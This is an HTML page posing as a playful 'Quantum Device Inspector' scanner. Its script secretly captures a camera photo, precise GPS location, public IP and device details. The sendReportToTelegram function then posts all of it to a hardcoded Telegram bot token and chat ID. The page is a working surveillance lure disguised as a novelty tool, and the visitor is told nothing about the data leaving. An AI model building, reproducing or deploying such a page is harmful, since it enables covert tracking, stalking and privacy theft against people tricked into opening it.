<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Quantum Device Inspector</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
    }
    body { 
      font-family: 'Roboto', Arial, sans-serif; 
      text-align: center; 
      padding: 20px; 
      background: #1a1a1a;
      color: white;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .scanner-box {
      width: 300px;
      height: 300px;
      border: 4px solid var(--primary);
      border-radius: 20px;
      margin: 20px auto;
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 30px rgba(46, 204, 113, 0.3);
    }
    .scanner-line {
      position: absolute;
      width: 100%;
      height: 4px;
      background: var(--primary);
      animation: scan 3s infinite;
      box-shadow: 0 0 10px var(--primary);
    }
    @keyframes scan {
      0% { top: 0; opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { top: 100%; opacity: 0; }
    }
    button {
      padding: 15px 40px;
      font-size: 20px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      border: none;
      border-radius: 30px;
      cursor: pointer;
      transition: all 0.3s;
      color: white;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin: 20px;
      box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
    }
    #loading {
      display: none;
      font-size: 1.5em;
      color: var(--primary);
      text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
      margin: 10px;
    }
    .device-info {
      background: rgba(0,0,0,0.7);
      padding: 20px;
      border-radius: 15px;
      margin: 20px;
      max-width: 500px;
      text-align: left;
      display: none;
    }
    .info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      margin: 15px 0;
    }
    .info-item {
      padding: 10px;
      background: rgba(255,255,255,0.1);
      border-radius: 8px;
    }
    .gps-link {
      color: var(--secondary);
      text-decoration: none;
      display: inline-block;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h1 style="color: var(--primary); margin-bottom: 20px;">üõ∏ Quantum Device Inspector</h1>
  <div class="scanner-box">
    <div class="scanner-line"></div>
    <video id="video" width="300" height="300" autoplay playsinline muted></video>
  </div>
  <button id="capture-btn">üöÄ Start Full Scan</button>
  <div id="loading">üî≠ Scanning Quantum Signature...</div>
  <div class="device-info" id="device-info"></div>

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    let currentStream = null;
    let isScanning = false;

    // Enhanced Device Detection
    async function getAdvancedDeviceInfo() {
      const connection = navigator.connection || navigator.mozConnection;
      const battery = await (navigator.getBattery?.() || Promise.resolve(null));
      
      return {
        os: detectOS(),
        platform: navigator.platform,
        browser: detectBrowser(),
        ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
        cores: navigator.hardwareConcurrency || 'Unknown',
        battery: {
          level: battery?.level ? `${Math.round(battery.level * 100)}%` : 'N/A',
          charging: battery?.charging ? 'Charging' : 'Not charging'
        },
        network: {
          type: connection?.effectiveType || 'Unknown',
          ip: await getPublicIP(),
          speed: connection?.downlink ? `${connection.downlink}Mbps` : 'Unknown'
        },
        display: {
          resolution: `${screen.width}x${screen.height}`,
          density: `${window.devicePixelRatio}x`,
          orientation: screen.orientation?.type || 'Portrait'
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        gpu: await detectGPU()
      };
    }

    // GPS dengan Akurasi Tinggi
    async function getEnhancedLocation() {
      return new Promise((resolve, reject) => {
        const options = {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        };

        const watchId = navigator.geolocation.watchPosition(
          position => {
            if (position.coords.accuracy <= 50) {
              navigator.geolocation.clearWatch(watchId);
              resolve(position);
            }
          },
          error => reject(error),
          options
        );

        setTimeout(() => {
          navigator.geolocation.clearWatch(watchId);
          reject(new Error('GPS timeout'));
        }, 30000);
      });
    }

    // Fungsi Deteksi
    function detectOS() {
      const ua = navigator.userAgent;
      if (/Android/i.test(ua)) return 'Android';
      if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
      if (/Windows/i.test(ua)) return 'Windows';
      if (/Mac/i.test(ua)) return 'macOS';
      if (/Linux/i.test(ua)) return 'Linux';
      return 'Unknown';
    }

    function detectBrowser() {
      const ua = navigator.userAgent;
      if (/Edg/i.test(ua)) return 'Edge';
      if (/Chrome/i.test(ua)) return 'Chrome';
      if (/Firefox/i.test(ua)) return 'Firefox';
      if (/Safari/i.test(ua)) return 'Safari';
      return 'Unknown';
    }

    async function detectGPU() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
      } catch {
        return 'N/A';
      }
    }

    async function getPublicIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch {
        return 'N/A';
      }
    }

    // Tampilkan Informasi Perangkat
    function showDeviceInfo(info, location) {
      const deviceInfo = document.getElementById('device-info');
      const mapsUrl = `https://www.google.com/maps?q=${location.coords.latitude},${location.coords.longitude}`;
      
      deviceInfo.innerHTML = `
        <h3 style="color: var(--primary)">üì° Device Matrix</h3>
        <div class="info-grid">
          <div class="info-item">
            <div>üñ• OS</div>
            <div>${info.os}</div>
          </div>
          <div class="info-item">
            <div>üßÆ Cores</div>
            <div>${info.cores}</div>
          </div>
          <div class="info-item">
            <div>üíæ RAM</div>
            <div>${info.ram}</div>
          </div>
          <div class="info-item">
            <div>üîã Battery</div>
            <div>${info.battery.level}</div>
          </div>
          <div class="info-item">
            <div>üåê Network</div>
            <div>${info.network.type}</div>
          </div>
          <div class="info-item">
            <div>üñ• GPU</div>
            <div>${info.gpu.renderer}</div>
          </div>
        </div>
        
        <h3 style="color: var(--primary); margin-top: 20px;">üìç GPS Signature</h3>
        <div class="info-grid">
          <div class="info-item">
            <div>Latitude</div>
            <div>${location.coords.latitude.toFixed(6)}</div>
          </div>
          <div class="info-item">
            <div>Longitude</div>
            <div>${location.coords.longitude.toFixed(6)}</div>
          </div>
          <div class="info-item">
            <div>Accuracy</div>
            <div>${Math.round(location.coords.accuracy)}m</div>
          </div>
        </div>
        <a href="${mapsUrl}" target="_blank" class="gps-link">üåç View in Google Maps</a>
      `;
      deviceInfo.style.display = 'block';
    }

    // Proses Utama
    async function startQuantumScan() {
      if (isScanning) return;
      isScanning = true;
      loading.style.display = 'block';

      try {
        const [deviceInfo, location, image] = await Promise.all([
          getAdvancedDeviceInfo(),
          getEnhancedLocation(),
          captureImage()
        ]);

        showDeviceInfo(deviceInfo, location);
        await sendReportToTelegram(image, deviceInfo, location);
        showToast('Report sent successfully!', 'success');
      } catch (error) {
        showError('Scan Failed', error);
      } finally {
        isScanning = false;
        loading.style.display = 'none';
      }
    }

    // Fungsi Kamera
    async function initCamera() {
      try {
        const constraints = {
          video: { 
            facingMode: 'environment',
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        };

        if (currentStream) currentStream.getTracks().forEach(t => t.stop());
        
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        currentStream = stream;
        video.srcObject = stream;
        await video.play();
      } catch (error) {
        showError('Camera Error', error);
      }
    }

    // Fungsi Lainnya
    async function captureImage() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      return canvas.toDataURL('image/webp', 0.85);
    }

    async function sendReportToTelegram(image, deviceInfo, location) {
      const formData = new FormData();
      const blob = await fetch(image).then(r => r.blob());
      const mapsUrl = `https://www.google.com/maps?q=${location.coords.latitude},${location.coords.longitude}`;

      const caption = `üì° *Quantum Device Report*\n\n` +
        `üñ• *OS*: ${deviceInfo.os}\n` +
        `üßÆ *Cores*: ${deviceInfo.cores}\n` +
        `üíæ *RAM*: ${deviceInfo.ram}\n` +
        `üîã *Battery*: ${deviceInfo.battery.level}\n` +
        `üåê *Network*: ${deviceInfo.network.type}\n` +
        `üìç *Location*: [Google Maps](${mapsUrl})\n` +
        `üéØ *Accuracy*: ${Math.round(location.coords.accuracy)}m`;

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'device_report.webp');
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    // Inisialisasi
    if (navigator.mediaDevices) {
      initCamera();
      document.getElementById('capture-btn').onclick = startQuantumScan;
    } else {
      alert('Device not supported!');
    }
  </script>
</body>
</html>
